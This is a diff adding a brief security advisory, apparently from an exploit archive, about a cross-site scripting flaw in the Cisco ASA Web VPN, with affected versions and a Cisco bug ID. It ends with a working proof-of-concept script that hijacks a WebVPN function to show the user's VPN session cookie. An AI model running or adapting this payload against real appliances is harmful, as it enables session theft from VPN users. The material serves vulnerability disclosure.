@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/35476/info
+
+Cisco ASA (Adaptive Security Appliance) is prone to a cross-site scripting vulnerability because its Web VPN fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site and to steal cookie-based authentication credentials.
+
+This issue is documented by Cisco Bug ID CSCsy80694.
+
+Cisco ASA 8.0.(4), 8.1.2, and 8.2.1 are vulnerable. 
+
+<html><script> function a(b, c) { return "alert('Your VPN location:\\n\\n'+" + "document.location+'\\n\\n\\n\\n\\n" + "Your VPN cookie:\\n\\n'+document.cookie);"; } CSCO_WebVPN['process'] = a; csco_wrap_js(''); </script></html> 
